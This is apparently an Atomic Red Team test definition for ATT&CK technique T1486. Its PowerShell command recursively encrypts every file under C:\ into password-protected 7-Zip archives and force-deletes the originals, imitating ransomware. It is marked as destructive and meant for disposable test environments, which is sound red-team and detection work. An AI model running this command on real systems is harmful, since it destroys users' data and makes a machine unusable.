attack_technique: T1486
display_name: Data Encrypted for Impact - Destructive Custom

atomic_tests:
  - name: Encrypt files on C drive with 7zip (destructive)
    auto_generated_guid: e7c6b38c-3c42-4a2e-bf89-c1e6a2c6e011
    description: |
      Simulates ransomware behavior by encrypting all files under C:\ using 7-Zip.
      ⚠️ This is a **destructive test**. Use in disposable environments only.
    supported_platforms:
      - windows
    input_arguments:
      target_path:
        description: Path to encrypt
        type: string
        default: "C:\\"
      password:
        description: Password used for encryption
        type: string
        default: "ChaymaOumayma2025"
    dependencies:
      - description: 7z.exe must be available in the PATH
        prereq_command: |
          if (Get-Command 7z.exe -ErrorAction SilentlyContinue) {exit 0} else {exit 1}
        get_prereq_command: |
          Write-Host "Download and install 7-Zip from https://www.7-zip.org/"
    executor:
      name: powershell
      elevation_required: true
      command: |
        $ErrorActionPreference = "SilentlyContinue"
        $files = Get-ChildItem -Path "#{target_path}" -Recurse -File
        foreach ($file in $files) {
          $zipPath = "$($file.FullName).7z"
          & 7z.exe a -p#{password} -mhe=on "$zipPath" "$($file.FullName)" | Out-Null
          Remove-Item "$($file.FullName)" -Force
        }
